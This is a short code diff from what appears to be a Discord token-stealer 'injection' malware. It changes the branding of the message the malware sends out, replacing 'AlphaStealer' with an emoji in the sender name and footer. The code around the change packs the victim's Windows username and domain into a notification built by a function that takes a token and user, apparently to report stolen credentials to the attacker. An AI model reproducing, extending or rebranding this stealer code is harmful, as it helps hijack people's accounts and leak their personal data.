@@ -250,7 +250,7 @@ const notify = async (ctx, token, user) => {
     ];
 
     ctx.content = `\`${process.env.USERNAME}\` - \`${process.env.USERDOMAIN}\`\n\n${ctx.content}`;
-    ctx.username = `AlphaStealer - Injection`;
+    ctx.username = `💜 - Injection`;
     ctx.avatar_url = `https://imgur.com/0sGc00W.png`;
 
     ctx.embeds[0].fields.unshift({
@@ -298,7 +298,7 @@ const notify = async (ctx, token, user) => {
         };
 
         embed.footer = {
-            text: 'Developed By AlphaStealer',
+            text: 'Developed By 💜',
             icon_url: "https://imgur.com/0sGc00W.png",
         };
 
